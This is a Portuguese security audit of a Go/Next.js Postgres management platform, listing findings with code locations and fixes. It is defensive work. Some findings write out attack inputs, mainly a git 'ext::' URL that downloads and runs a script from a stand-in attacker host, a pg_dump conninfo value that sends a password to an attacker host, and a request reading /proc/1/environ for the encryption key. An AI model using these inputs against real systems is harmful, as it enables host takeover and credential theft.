# Relatório de Segurança — gest-postgres

**Data:** 2026-07-20
**Escopo:** revisão de segurança de toda a base (backend Go ~15k LOC, frontend Next.js, `firewall-agent`, `docker-compose.yml`, `setup.sh`, Dockerfiles, migrations).
**Método:** leitura manual do núcleo de auth/cripto/roteamento + 6 auditorias paralelas por domínio (SQLi, injeção de comando, path traversal, SSRF/OAuth/segredos, frontend, modelo de privilégio Docker). Nenhum arquivo foi alterado.
**Público-alvo deste doc:** o próprio modelo que vai corrigir. Cada item tem local exato, caminho de ataque e correção proposta.

---

## 0. Resumo executivo — o fio condutor

O projeto tem boa higiene em vários pontos difíceis: criptografia AES-256-GCM correta, `bcrypt`, tokens de sessão de 32 bytes guardados só como hash, HMAC de webhook em tempo constante, disciplina de `pgx.Identifier{}.Sanitize()` em quase todo identificador SQL, ordem correta do `ufw` (SSH liberado antes de habilitar) e um `firewall-agent` bem trancado. **Não há SQL injection nem XSS exploráveis por usuário anônimo ou `viewer`.**

O problema não está nos primitivos isolados — está no **modelo de confiança agregado**. Três verdades estruturais dominam o risco:

1. **`admin` ≈ root no host, por design.** O `docker-socket-proxy` está configurado com `POST + CONTAINERS + EXEC + BUILD`. O proxy só filtra *quais endpoints* da API Docker são alcançáveis; ele **não consegue inspecionar o corpo** de um `ContainerCreate`, então qualquer `HostConfig` (privileged, binds de host, namespaces, cap_add) passa. Como o daemon roda como root, "criar um container" = root no host. O comentário "restritas ao mínimo necessário" no compose descreve mal a superfície real.

2. **`viewer` ≈ `admin` em leitura de segredo.** O RBAC é feito só pelo método HTTP (`GET` = liberado pra viewer). Mas vários `GET` retornam segredo: senha de superusuário em texto puro, e — o mais grave — leitura arbitrária de arquivo de qualquer container, incluindo `/proc/1/environ` do próprio backend, que contém `CREDENTIAL_ENCRYPTION_KEY`. Um viewer decifra todos os segredos guardados.

3. **O backend é um ponto único de concentração, rodando como root.** Ele segura a credencial do proxy Docker, o socket do firewall, `/etc` do host (`:ro`) e `HOST_FILES_ROOT` (rw). Um RCE no backend (ver item 1 abaixo) = comprometimento do host sem escalonamento adicional.

Somado a isso, o padrão de instalação expõe a API em `http://<ip>:0.0.0.0:28080` — texto puro, porta publicada que **passa por cima do ufw** — com cookie de sessão sem `Secure`. O resultado: sniff de rede ou um único session hijack entrega o host.

### Tabela de severidade (deduplicada)

| # | Sev | Área | Item |
|---|-----|------|------|
| 1 | **CRÍTICO** | RCE | `git clone` com `repo_url` sem validação → transporte `ext::` = RCE no container do backend |
| 2 | **CRÍTICO** | RBAC/Segredo | `viewer` lê `/proc/1/environ` do backend via file manager → `CREDENTIAL_ENCRYPTION_KEY` (leitura arbitrária de arquivo em qualquer container) |
| 3 | **ALTO** | RBAC/Segredo | `viewer` revela senha de superusuário em texto puro (`GET /servers/{id}/password`) |
| 4 | **ALTO** | Privilégio Docker | Proxy `POST+CONTAINERS+EXEC+BUILD` = daemon root; compose e `AttachVolume` permitem bind de host `/` → root no host |
| 5 | **ALTO** | Exposição de rede | Portas publicadas passam por cima do ufw; API admin exposta na internet |
| 6 | **ALTO** | Transporte | HTTP/WS em texto puro por padrão + cookie de sessão sem `Secure` → hijack de sessão |
| 7 | **ALTO** | Blast radius | Backend roda como root segurando proxy Docker + socket firewall + `/etc` + FS do host |
| 8 | **MÉDIO** | OAuth | `state` fixo `"gestpg"`, nunca validado → CSRF de vinculação de conta Google Drive |
| 9 | **MÉDIO** | Segredo | Token do bot Telegram vaza em log e corpo de erro da API |
| 10 | **MÉDIO** | CSRF/CORS | CORS reflete qualquer Origin com `Allow-Credentials: true`; só `SameSite=Lax` segura |
| 11 | **MÉDIO** | CSWSH | WebSocket do terminal com `InsecureSkipVerify: true` (sem checagem de Origin no endpoint de RCE) |
| 12 | **MÉDIO** | Segredo | PAT do Git embutido no argv do `git clone` e persistido no log de build |
| 13 | **MÉDIO** | SSRF | `webhook_url` de canal/alerta sem allowlist de host/esquema (metadata, proxy, localhost) |
| 14 | **MÉDIO** | Path traversal | Nome de `database` no backup sem validação → delete/stat arbitrário fora de `/backups` |
| 15 | **MÉDIO** | Injeção conninfo | `pg_dump -d <database>` aceita conninfo → exfiltra senha pra host do atacante |
| 16 | **MÉDIO** | RBAC | Escrita/exclusão de arquivo em container/volume sem step-up e mirando containers da própria plataforma |
| 17 | **MÉDIO** | Segredo | `.env` sem `chmod 600` → segredos world-readable em host multiusuário |
| 18 | **MÉDIO** | Blast radius | `/etc:/hostfs:ro` (shadow/ssh/sudoers) montado em container root |
| 19 | BAIXO | Auth | Sem rate-limit/lockout no login; enumeração de usuário por timing |
| 20 | BAIXO | Auth bypass | Regra de rota pública por sufixo `/webhook` é frágil |
| 21 | BAIXO | DoS | Sem `ReadTimeout`/`WriteTimeout`; corpo JSON sem limite (`MaxBytesReader`) |
| 22 | BAIXO | SQL | Filtros só de `;` não são barreira — `DropFunction`/`CHECK`/`DEFAULT` (admin) |
| 23 | BAIXO | SQL | Campos do `pg_hba.conf` aceitam espaço embutido (smuggling de token) |
| 24 | BAIXO | Frontend | Histórico SQL em `localStorage` (texto puro, sobrevive a logout) |
| 25 | BAIXO | Frontend | Sem CSP / `X-Frame-Options` (clickjacking) |
| 26 | BAIXO | Path traversal | `resolveHostPath` valida o caminho resolvido mas retorna o não-resolvido (TOCTOU) |
| 27 | BAIXO | Path traversal | Extração de tar no restore de volume sem sanitização de nível de app |
| 28 | BAIXO | Validação | `validateFilename` bloqueia `/` mas não `..`/`.` |
| 29 | BAIXO | Validação | `volumeName` da URL concatenado no bind spec (injeção de `:`) |
| 30 | BAIXO | SSRF | `target_url` do Traefik sem guarda de host interno + escape de YAML |
| 31 | BAIXO | Cripto | Chave única sem AAD/separação de domínio, sem rotação |
| 32 | BAIXO | Transporte | `sslmode=disable` nas conexões ao Postgres gerenciado |
| 33 | INFO | Segredo | Senha admin ecoada no stdout do setup / log de bootstrap |

---

## 1. CRÍTICO — RCE no backend via `git clone` (transporte `ext::` / injeção de argumento)

**Arquivo:** `backend/internal/infra/git_build.go:19-28, 93`
**Rotas:** `POST /api/v1/infra/containers/from-git`, `POST /api/v1/infra/git-deployments`, `POST /api/v1/infra/git-deployments/{id}/redeploy`, e o **webhook público** `POST /api/v1/infra/git-deployments/{id}/webhook` (dispara `RedeployFromGit` com `repo_url` já armazenada).

```go
// git_build.go — validação (única): repoURL != "" e branch default "main"
cloneCmd := exec.CommandContext(ctx, "git", "clone", "--branch", branch, "--depth", "1", cloneURL, dir)  // :93
```

No caminho sem credencial (repositório público, o mais comum) `cloneURL = repoURL` cru — sem `url.Parse`, sem allowlist de esquema, sem `--` de fim de opções, e **sem `GIT_ALLOW_PROTOCOL`/`protocol.ext.allow`** em lugar nenhum (confirmado por grep).

**Exploits:**
- **`ext::` → execução de comando.** `repo_url = "ext::sh -c 'curl http://atacante/x|sh'"`. A política default do transporte `ext` do git é "user" (permitido em URL de linha de comando), então `git clone` executa o shell. RCE **dentro do container do backend**.
- **Injeção de argumento por traço.** Sem `--`, um `repo_url` começando com `-` vira opção do git (`--upload-pack=...`, `-c core.sshCommand=...`).
- **`file://`** → clona do próprio FS do backend (`file:///hostfiles/...`).

**Por que é crítico:** o container do backend segura `CREDENTIAL_ENCRYPTION_KEY` e `ADMIN_PASSWORD` (env), a credencial do `docker-socket-proxy` (→ root no host, ver item 4), `/etc` do host (`:ro`), `HOST_FILES_ROOT` (rw) e o socket do firewall. RCE aqui = comprometimento total. Não existe terminal web pro próprio container do backend, então esse caminho alcança um alvo que o terminal não alcança. A configuração de uma nova URL exige `admin`, mas o código roda também pelo webhook (background, sem sessão) — e é uma injeção clássica que deve ser fechada independente do gate.

**Correção:**
1. Validar `repoURL` com `url.Parse` e allowlist de esquema (`https`, `http`, `ssh`, forma `git@host:path`) em **todos** os caminhos, não só no de PAT; rejeitar valor contendo `::` ou começando com `-`.
2. Validar `branch` contra `^[A-Za-z0-9._/-]+$`, rejeitar traço inicial.
3. Adicionar `--` antes dos posicionais: `git clone --branch <b> --depth 1 -- <url> <dir>`.
4. `cloneCmd.Env = append(..., "GIT_ALLOW_PROTOCOL=https:ssh")` (ou `-c protocol.ext.allow=never`) pra matar `ext::`/`file::` na raiz.

---

## 2. CRÍTICO — `viewer` lê arquivo arbitrário de qualquer container → chave de criptografia

**Arquivo:** `backend/internal/api/files.go:75-100, 134-148, 160-185` (handlers GET), `backend/internal/infra/container_files.go:14` (`validatePath`), `backend/internal/api/middleware.go:106-113` (regra RBAC), `router.go:117-119, 122, 125-127, 130`.

```go
// files.go:93 — GET, sem requireAdmin no router; containerId e path crus
content, err := h.service.ReadContainerFile(r.Context(), r.PathValue("containerId"), queryPath(r))
```

`withAuth` só restringe **não-GET** a admin. Todos os endpoints de listar/ler/baixar arquivo são GET → um `viewer` autenticado passa. `validatePath` permite propositalmente o **filesystem inteiro** do container.

**Exploit (viewer):**
```
GET /api/v1/infra/containers/<id-do-backend>/files/content?path=/proc/1/environ
```
→ vaza `CREDENTIAL_ENCRYPTION_KEY`, `ADMIN_PASSWORD`, credenciais do metadata-db. Com a chave, o viewer decifra **todos** os segredos guardados (senhas de todo Postgres gerenciado, PATs do Git, tokens Telegram, refresh_token do Drive). Também: ler arquivos de dados do `metadata-db`, qualquer segredo em qualquer container do host. O mesmo vale pra file manager de volume (`files.go:178`) e de host (confinado a `HOST_FILES_ROOT`, mas ainda acessível por viewer).

**Correção:** tratar leitura/listagem/download de arquivo como privilegiado — colocar os endpoints de container/volume/host atrás de `requireAdmin` (ou capability dedicada). Excluir os containers da própria plataforma (`backend`, `metadata-db`, `docker-socket-proxy`) e `/proc` do file manager de container.

---

## 3. ALTO — `viewer` revela senha de superusuário em texto puro

**Arquivo:** `router.go:50`, handler `backend/internal/api/server_detail.go:397-405`.

```go
mux.HandleFunc("GET /api/v1/servers/{id}/password", detail.Password)   // sem requireAdmin, e é GET
...
httpx.WriteJSON(w, http.StatusOK, map[string]string{"password": password})   // texto puro decifrado
```

Mesma classe do item 2: GET → viewer liberado. O papel "só monitoramento" extrai a senha de superusuário de todo servidor gerenciado e conecta direto no banco, contornando a plataforma.

**Correção:** gatear com `requireAdmin` (como já é feito em `/users`), ou mover pra POST + `requireElevated` (step-up). Não confiar no verbo HTTP pra autorizar leitura de segredo.

---

## 4. ALTO — Modelo de privilégio Docker: uma sessão admin (ou um RCE) = root no host

**Arquivo:** `docker-compose.yml:55-80` (proxy), `backend/internal/infra/compose.go:43-91`, `backend/internal/infra/container_detail.go:59-70`.

O `docker-socket-proxy` habilita `CONTAINERS=1, IMAGES=1, NETWORKS=1, VOLUMES=1, POST=1, INFO=1, SYSTEM=1, BUILD=1, EXEC=1`. O proxy é uma allowlist de **caminho de API**, não um filtro de corpo — com `POST+CONTAINERS`, `ContainerCreate` aceita `HostConfig` arbitrário (`Privileged`, `Binds`, `CapAdd`, `Devices`, `PidMode`, `NetworkMode`). Daemon roda como root → um container privilegiado/bind de host = root no host.

Escapes concretos, todos admin-only mas cada um amplia o raio de um único session hijack:
- **Compose com HostConfig arbitrário** (`compose.go`): deploy de stack com `privileged: true, volumes: ["/:/host"]`, depois abrir Terminal (`EXEC=1`) → `chroot /host`.
- **`AttachVolumeToContainer` aceita bind de host** (`container_detail.go:66`):
  ```go
  bind := in.VolumeName + ":" + in.MountPath   // VolumeName nunca validado como volume nomeado
  ```
  `{"volume_name":"/","mount_path":"/host"}` → recria o container com a raiz do host montada → Terminal → root. Confirmado por leitura direta do código.
- **EXEC** dá shell em qualquer container do host.
- **BUILD / Git** roda `RUN` arbitrário no daemon.

Nota: `/var/run/docker.sock:...:ro` — o `:ro` só torna o **nó de arquivo** read-only; a **API Docker sobre ele é read-write completa**. Padrão enganoso, não protege contra writes.

**Correção:** se compose/create genéricos são requisito, não há como torná-los seguros pelo proxy atual — precisa de uma camada de política que parseie o `HostConfig`/compose e rejeite `privileged`, binds de caminho de host, namespaces de host, `cap_add`, `devices`. No mínimo: validar `VolumeName` em `AttachVolume` contra `^[a-zA-Z0-9][a-zA-Z0-9_.-]+$` (rejeitar `/` e `.` inicial) ou resolver contra `VolumeList`. E tratar/documentar "pode fazer compose/create/build" como equivalente a "é root no host".

---

## 5. ALTO — Portas publicadas passam por cima do ufw; API admin exposta na internet

**Arquivo:** `docker-compose.yml:95-96` (`28080:28080`) e `:137-138` (`4173:4173`), `setup.sh:207-221`.

O Docker insere as regras de publicação de porta nas cadeias `nat`/`DOCKER` do iptables **antes** do filtro `INPUT` do ufw. O `setup.sh` habilita ufw só com `22/tcp` liberado, dando falsa sensação de proteção: `28080` (API admin inteira, incluindo `/auth/login`) e `4173` ficam alcançáveis da internet independente do ufw. O firewall que a plataforma gerencia não restringe — e não consegue, como está — as próprias portas publicadas.

**Correção:** publicar em loopback e colocar atrás do reverse proxy (`127.0.0.1:28080:28080`), ou adicionar regras na cadeia `DOCKER-USER`, ou documentar que o filtro de 28080/4173 tem que ser feito no firewall do provedor de nuvem.

---

## 6. ALTO — HTTP/WS em texto puro por padrão + cookie de sessão sem `Secure`

**Arquivo:** `setup.sh:106` (`PUBLIC_API_URL=http://<ip>:28080`), `backend/internal/api/auth.go:20-28` (cookie), `frontend/src/lib/api.ts:1`, `frontend/src/components/infra/container-detail/terminal-tab.tsx:33` (`ws://`).

```go
// auth.go — HttpOnly e SameSite=Lax, mas SEM Secure
http.SetCookie(w, &http.Cookie{Name: sessionCookieName, Value: token, Path: "/", HttpOnly: true, SameSite: http.SameSiteLaxMode, MaxAge: maxAge})
```

Instalação padrão publica a API em `http://`. Login (usuário/senha admin), `GET /servers/{id}/password`, secret de webhook, o próprio cookie de sessão de 30 dias e o **terminal interativo (`ws://`)** cruzam a rede em texto puro. Atacante on-path rouba o cookie → admin completo → root no host (via itens 2/4). O terminal por `ws://` entrega um shell root ao vivo pra quem estiver na rede.

**Correção:** exigir TLS em produção (a plataforma já gerencia Traefik+ACME) — servir a API por HTTPS, `PUBLIC_API_URL=https://...` (o terminal sobe pra `wss://` sozinho), e adicionar `Secure: true` ao cookie (preferir `SameSite=Strict` nessa superfície admin). No mínimo, avisar de forma ruidosa no `setup.sh` que o default é sem criptografia.

---

## 7. ALTO — Backend roda como root concentrando toda capacidade sensível

**Arquivo:** `backend/Dockerfile` (sem `USER` → root), `docker-compose.yml:97-116`.

Um único RCE no backend entrega, sem escalonamento adicional:
- **Controle do daemon Docker** via `DOCKER_HOST` proxy → root no host (itens 4).
- **`/etc:/hostfs:ro`** (`:101`) — como root lê `/etc/shadow`, `/etc/ssh/*`, sudoers → crack offline / movimento lateral.
- **`${HOST_FILES_ROOT}:/hostfiles`** rw (`:107`) — escrita num diretório do host.
- **Socket Unix do firewall** (`:116`) — abrir portas do host.
- **`/stacks`, `/traefik-dynamic`, `/backups`** — escrever compose e config dinâmica do Traefik que depois executam/roteiam.

Sem `cap_drop`, `security_opt: no-new-privileges`, `read_only` nem `USER` não-root.

**Correção:** rodar o backend com UID não-root (`USER` no Dockerfile), `security_opt: [no-new-privileges:true]`, `cap_drop: [ALL]`, trocar o mount de `/etc` por um mecanismo de disk-stat mais estreito, e montar `HOST_FILES_ROOT` só se o file manager de host for de fato usado.

---

## 8. MÉDIO — OAuth `state` fixo, nunca validado (CSRF de vinculação de conta)

**Arquivo:** `backend/internal/server/gdrive_config.go:122` (`AuthCodeURL("gestpg", ...)`), `backend/internal/api/backup.go:196-212` (`Callback` lê só `code`).

`state` é a constante `"gestpg"` e o callback nunca a lê/verifica. O callback exige sessão (`SameSite=Lax` deixa o redirect top-level do Google carregar o cookie), então **não** é alcançável sem auth — mas esse gate é a única defesa de CSRF; o `state` não fornece nenhuma.

**Exploit:** um usuário autenticado (até viewer via `GET /gdrive/auth-url`) pega a URL de consentimento/client_id, completa o consentimento com a conta Google **do atacante** e captura um `code` válido. Depois induz um admin logado a `https://vitima/api/v1/gdrive/callback?code=<code_do_atacante>&state=gestpg`. O backend troca e guarda o `refresh_token` **do atacante** → todo backup (dumps completos) passa a subir pro Drive do atacante.

**Correção:** gerar `state` aleatório criptográfico, guardar ligado à sessão do admin, e rejeitar o callback se não bater (ou se ausente).

---

## 9. MÉDIO — Token do bot Telegram vaza via mensagem de erro (log + resposta da API)

**Arquivo:** `backend/internal/server/notification_channels.go:137, 163-182`; sinks em `backend/internal/server/alerts.go:282` e `backend/internal/api/notification_channels.go:54`.

```go
c.WebhookURL = "https://api.telegram.org/bot" + token + "/sendMessage"   // :137
...
resp, err := http.DefaultClient.Do(req)
if err != nil { return err }   // *url.Error.Error() inclui a URL inteira (com token)
```

Em falha de transporte (DNS, timeout, conexão recusada) o `*url.Error` vira `Post "https://api.telegram.org/bot<TOKEN>/sendMessage": ...`, que é (1) logado em texto puro em `alerts.go:282` e (2) devolvido no corpo 422 por `TestNotificationChannel` (`notification_channels.go:54`). Quem tem acesso a log ou captura a resposta do teste recupera o token → controle do bot.

**Correção:** não embutir o token na URL que entra em string de erro; enviar o token só no dispatch e/ou envelopar o erro de transporte redigindo `api.telegram.org/bot.*?/` antes de logar/retornar.

---

## 10. MÉDIO — CORS reflete qualquer Origin com credenciais; sem token CSRF

**Arquivo:** `backend/internal/api/middleware.go:31-46`; frontend usa `credentials: "include"` em todo request (`frontend/src/lib/api.ts`).

```go
if origin := r.Header.Get("Origin"); origin != "" {
    w.Header().Set("Access-Control-Allow-Origin", origin)      // reflete qualquer origem
    w.Header().Set("Access-Control-Allow-Credentials", "true")
}
```

Qualquer site pode fazer request cross-origin com credenciais e ler a resposta — o CORS libera incondicionalmente. Hoje o único freio é o cookie `SameSite=Lax` (que impede o `fetch()` cross-site de anexar o cookie). Toda a defesa de CSRF/leitura cross-origin repousa nesse único controle frágil: se o cookie virar `SameSite=None` (ex.: pra suportar front cross-origin), qualquer site passa a ler senhas de superusuário via `GET /servers/{id}/password`.

**Correção:** trocar reflexão por allowlist explícita derivada de `PUBLIC_API_URL`/config de deploy. Manter `SameSite=Lax`/`Strict`. Considerar token anti-CSRF em rotas de escrita como defesa em profundidade.

---

## 11. MÉDIO — WebSocket do terminal desliga validação de Origin (CSWSH)

**Arquivo:** `backend/internal/api/terminal.go:41`.

```go
conn, err := websocket.Accept(w, r, &websocket.AcceptOptions{InsecureSkipVerify: true})
```

O upgrade de exec não faz checagem de Origin, então uma página cross-site pode tentar abrir um shell interativo (execução arbitrária em qualquer container — o endpoint mais perigoso). Igual ao item 10, hoje só é barrado por `SameSite=Lax`. `InsecureSkipVerify` joga fora exatamente a defesa em profundidade que esse endpoint mais precisa.

**Correção:** trocar `InsecureSkipVerify: true` por `OriginPatterns` validando contra a origem conhecida do frontend.

---

## 12. MÉDIO — PAT do Git no argv do `git clone` e persistido no log de build

**Arquivo:** `backend/internal/infra/git_build.go:73-77, 93, 99, 103`; persistência em `git_deployments.go:233` (`last_build_log`).

```go
u.User = url.UserPassword(username, secret)   // PAT na userinfo da URL
cloneURL = u.String()
cloneCmd := exec.CommandContext(ctx, "git", "clone", ..., cloneURL, dir)   // PAT no argv
```

O PAT fica no argv → legível em `/proc/<pid>/cmdline` por qualquer processo no container do backend. `cloneLog` captura stdout+stderr, é persistido em `git_deployments.last_build_log` e devolvido em `BuildResult.Log` — se o git ecoar a URL com credencial em erro, o token chega ao banco e às respostas da API. (O caminho SSH é melhor: só o *path* da chave vai no `GIT_SSH_COMMAND`.)

**Correção:** não embutir o PAT na URL/argv — usar `GIT_ASKPASS`/credential helper ou header via env; redigir `://user:token@` de qualquer log antes de persistir/retornar.

---

## 13. MÉDIO — SSRF cego via `webhook_url` de canal/alerta

**Arquivo:** `backend/internal/server/notification_channels.go:80-82, 163-182`; `backend/internal/server/alerts.go:41-43`.

`postJSON` usa `http.DefaultClient` (segue até 10 redirects) contra a URL crua, sem validação. Rotas: `POST /notification-channels`, `.../{id}/test`, `POST /servers/{id}/alert-rules`. A URL pode mirar serviços internos alcançáveis do backend — `http://169.254.169.254/...` (metadata de nuvem), `http://localhost`, `http://docker-socket-proxy:2375/...`. É SSRF **cego** (só o status code volta, não o corpo), então exfiltração é limitada; o `firewall-agent` é socket Unix, não alcançável assim. Admin-only.

**Correção:** validar esquema (só http/https) e bloquear resolução pra loopback/link-local/RFC1918 e pros hosts do proxy/metadata; desabilitar seguir redirect ou revalidar cada hop.

---

## 14. MÉDIO — Path traversal via nome de `database` no backup

**Arquivo:** `backend/internal/server/backup.go:58-61, 85`; `backend/internal/server/backup_storage.go:32-48, 59-64`; `backend/internal/api/backup.go:13-24`.

`CreateBackup` valida só `database != ""` (sem `identRegex`). `database` vira nome de arquivo: `filepath.Join("/backups/<uuid>", "../../hostfiles/pwn_TS.dump")` → escapa pro bind de host. O `os.Rename` cross-mount falha (`EXDEV`), então a **escrita** fica praticamente confinada; mas o `Filename` malicioso é persistido e reutilizado por `LocalStorage.Delete`/`Open` (`os.Remove`/`os.Stat`, **não** limitados por EXDEV) → **delete/stat arbitrário** cross-mount. Exige antes um `CREATE DATABASE "../../hostfiles/pwn"` pelo editor SQL (o `CreateDatabase` da plataforma bloqueia via `identRegex`, o editor cru não).

**Correção:** validar `database` com `identRegex` em `CreateBackup`, e endurecer `LocalStorage.Store` — rejeitar filename com `/`/`..` ou usar `filepath.Base` e reconferir que fica sob `backupsBaseDir`.

---

## 15. MÉDIO — Injeção de conninfo no `pg_dump -d`

**Arquivo:** `backend/internal/server/backup.go:341-349`.

```go
cmd := exec.CommandContext(ctx, "pg_dump", "-h", record.ContainerName, "-p", "5432",
    "-U", record.Username, "-d", database, "-Fc", "-f", destPath)
cmd.Env = append(cmd.Environ(), "PGPASSWORD="+password)
```

libpq trata `-d` como conninfo completa se contiver `=`/URI, e as keywords sobrescrevem `-h/-p/-U`. `database` vem do corpo de `POST /servers/{id}/backups` sem validação (o caminho de *restore* valida com `identRegex`, o de dump não). Valor tipo `dbname=postgres host=atacante.example.com user=postgres` redireciona a conexão pro host do atacante; como `PGPASSWORD` está no ambiente, a senha do servidor gerenciado é transmitida ao endpoint do atacante → **exfiltração de credencial**.

**Correção:** validar `database` com `identRegex` antes de chegar em `runPgDump`; usar a forma URL `postgres://` ou `PGDATABASE` no env pra impedir smuggling de conninfo.

---

## 16. MÉDIO — Escrita/exclusão de arquivo em container/volume sem step-up e mirando a própria plataforma

**Arquivo:** `backend/internal/api/files.go:102-132, 150-156, 187-217`; `router.go:120-121, 123, 128-129, 131`.

Escrita/upload/exclusão de host estão sob `requireElevated`; as equivalentes de container/volume estão registradas cruas — admin, sem step-up. `WriteContainerFile`/`DeleteContainerFile` aceitam qualquer `containerId` e path absoluto, então uma sessão admin (ou abusada via CSRF, ver item 10) sobrescreve arquivos no `metadata-db`, no próprio `backend`, etc. (`DeleteInContainer` usa `rm -rf -- <path>` em argv com `--`, sem injeção de comando; confinamento é o container inteiro, por design.)

**Correção:** aplicar `requireElevated` também a escrita/upload/exclusão de container/volume (paridade com o file manager de host) e bloquear os containers/volumes da própria plataforma dos endpoints mutáveis (proteção que já existe pra *remoção* de volume/rede, mas não pra escrita de arquivo).

---

## 17. MÉDIO — `.env` sem `chmod 600` (segredos world-readable)

**Arquivo:** `setup.sh:90-113`.

`cp .env.example .env` herda o umask default (tipicamente `0644`), depois é `chown`'d pro usuário mas **nunca `chmod 600`**. Em host multiusuário, qualquer usuário local lê `CREDENTIAL_ENCRYPTION_KEY` (decifra todo segredo guardado), `ADMIN_PASSWORD` e a senha do metadata-db.

**Correção:** `chmod 600 .env` logo após criar (mesmo tratamento já dado ao `/swapfile`).

---

## 18. MÉDIO — `/etc` do host montado em container root

**Arquivo:** `docker-compose.yml:101` (`/etc:/hostfs:ro`).

Justificado como statfs pra métrica de disco, mas expõe todo o `/etc` do host (shadow, ssh, sudoers, cron) a um processo root. Um statfs de um único arquivo inócuo, ou um mount dedicado minúsculo, dá a métrica sem expor credencial.

**Correção:** montar só o necessário pro statfs, ou usar outra fonte de métrica de disco.

---

## Itens BAIXO

**19 — Sem rate-limit/lockout no login; enumeração por timing.** `backend/internal/auth/login.go:61-90`. `bcrypt` freia brute-force online, mas sem throttle/lockout e com a porta exposta (item 5) é atacável; o `bcrypt.CompareHashAndPassword` só roda quando o usuário existe → diferença de timing permite enumerar usuários. **Correção:** throttle por IP / backoff exponencial em falhas; comparar contra um hash dummy quando o usuário não existe.

**20 — Regra de rota pública por sufixo `/webhook`.** `backend/internal/api/middleware.go:61-73`. Qualquer path terminando em `/webhook` pula `withAuth`. Hoje só existe a rota de git-deployment (com HMAC correto), mas a regra por sufixo torna pública qualquer rota futura terminando assim. **Correção:** casar o padrão exato da rota, não o sufixo.

**21 — Servidor HTTP sem timeouts; corpo JSON sem limite.** `backend/cmd/api/main.go:87-91` tem só `ReadHeaderTimeout`; sem `ReadTimeout`/`WriteTimeout`/`IdleTimeout` → slow-loris no corpo. `backend/internal/httpx/json.go` `DecodeJSON` não usa `http.MaxBytesReader` → corpo JSON gigante = DoS de memória. **Correção:** setar os timeouts; envolver o body com `MaxBytesReader` (ex.: 1–10 MB conforme a rota).

**22 — Filtros só de `;` não são barreira SQL (admin-only).** `functions.go:85-88` (`DropFunction` — `identity_args` cru; um `integer), public.other(text` derruba uma segunda função sem `;`), `db_objects.go:329-332` (CHECK de domínio), `tables.go:69-77` (DEFAULT de coluna). Não cruzam fronteira de privilégio (admin já roda SQL cru pelo editor), mas o filtro de `;` não é barreira real. **Correção:** resolver a assinatura server-side pelo OID (já há `IdentityArgs` por função) ou allowlist estrita; assumir os campos livres como SQL-por-design e tirar o filtro enganoso.

**23 — Campos do `pg_hba.conf` aceitam espaço embutido.** `backend/internal/server/hba.go:98-102`. Só bloqueia `\n\r#`; espaço/tab embutido em `UserName`/`Database`/`Address` faz smuggling de token na linha (o parser do hba quebra em qualquer whitespace). Admin-only, sem injeção de linha nova. **Correção:** rejeitar também `strings.ContainsAny(f, " \t")`; validar `Address` contra gramática CIDR/host.

**24 — Histórico SQL em `localStorage`.** `frontend/src/lib/use-query-history.ts:10,27`, `sql-editor-tab.tsx:34`. Texto SQL cru (que rotineiramente tem senha em `CREATE ROLE ... PASSWORD '...'`, PII) persiste por servidor, legível por qualquer script na origem e sobrevive a logout (o logout só limpa o cookie). **Correção:** não persistir texto cru, ou usar memória/`sessionStorage` e limpar no logout.

**25 — Sem CSP / `X-Frame-Options`.** `frontend/next.config.ts`. Sem CSP nem anti-frame; toda página admin é iframável (clickjacking em delete-server/prune). **Correção:** `headers()` com CSP restritiva, `X-Frame-Options: DENY` (ou `frame-ancestors 'none'`), `X-Content-Type-Options: nosniff`.

**26 — `resolveHostPath` TOCTOU.** `backend/internal/infra/host_files.go:45-64`. O prefix-check roda no `resolved` (`EvalSymlinks`), mas a função retorna `joined` (não resolvido), reaberto pelo SO no uso. Baixo risco hoje (o file manager de host só cria arquivos regulares, sem primitivo de criar symlink). **Correção:** operar sobre `resolved`, ou abrir com `O_NOFOLLOW`/`openat2(RESOLVE_BENEATH)`.

**27 — Extração de tar no restore de volume sem sanitização de app.** `backend/internal/infra/volume_backups.go:167-187`. `.tar.gz` vai direto pro `CopyToContainer` sem validar nomes de entrada (classe tar-slip/CVE-2018-15664). Mitigado por extrair num helper `alpine` efêmero que monta só o volume alvo em `/vol` — o que escapar cai no rootfs descartável. **Correção:** se algum dia extrair pra alvo real, adicionar loop rejeitando entradas cujo path limpo escapa `destDir` e entradas symlink/hardlink com alvo fora; documentar a dependência do helper efêmero.

**28 — `validateFilename` não bloqueia `..`/`.`.** `backend/internal/infra/container_files.go:37-42`. Bloqueia `/`/`\` mas `name == ".."` passa; vira entrada de tar → `destDir/..`. Impacto baixo (escopo já é o container inteiro / helper efêmero). **Correção:** rejeitar `.`/`..` explicitamente.

**29 — `volumeName` concatenado no bind spec.** `backend/internal/infra/container_files.go:141, 231`. `Binds: []string{volumeName + ":" + volumeMountPoint}`; o match de segmento único do Go 1.22 bloqueia `/`, mas `:` ainda injeta campos extras no spec (`foo:/x:/vol`). **Correção:** validar `volumeName` contra `^[a-zA-Z0-9][a-zA-Z0-9_.-]+$` antes de montar `Binds`.

**30 — `target_url` do Traefik sem guarda de host interno + escape de YAML.** `backend/internal/infra/traefik.go:277-280, 510-511`. Esquema/host validados, mas sem bloqueio de endereço interno (admin publica serviço interno sob domínio público via Traefik). O valor entra no YAML como `url: "%s"` — confirmar escape contra `"`/newline no `target_url`. **Correção:** guarda de host interno + escape/serialização segura de YAML.

**31 — Chave de criptografia única sem AAD/separação de domínio, sem rotação.** `backend/internal/crypto/secretbox.go`. Uma chave pra todos os tipos de segredo, sem AAD → um atacante com escrita no banco pode copiar um ciphertext de uma coluna pra outra e ele decifra. Sem caminho de rotação (reconhecido como fora do MVP). **Correção (futuro):** AAD por tipo/coluna; plano de rotação.

**32 — `sslmode=disable` no Postgres gerenciado.** `backend/internal/server/pgconn.go:25`, `service.go:220`. Tráfego (queries, dumps) na rede Docker sem TLS. Aceitável em rede interna, mas note. **Correção (futuro):** TLS interno quando houver.

**33 — INFO — Senha admin ecoada.** `setup.sh:244` imprime a senha admin uma vez (scrollback/CI capture); `backend/internal/auth/admin.go:34-35` loga a senha aleatória de fallback via `slog.Warn` (legível por `docker logs`/visualizador de log da plataforma). Aceitável pra bootstrap único, mas rotacione após o primeiro login.

---

## Confirmado OK (pra não reauditar)

- **Criptografia correta.** AES-256-GCM (`crypto/secretbox.go`), nonce aleatório de 12 bytes por `Seal`, prefixado ao ciphertext; comprimento de chave forçado (`config.go:55`, sem default hardcoded). Sem ECB/fallback.
- **Auth sólida no básico.** `bcrypt` (custo default); token de sessão de 32 bytes de `crypto/rand`, guardado só como SHA-256; expiração deslizante.
- **HMAC de webhook em tempo constante.** `git_deployments.go:102-113` (`hmac.Equal` / `subtle.ConstantTimeCompare`).
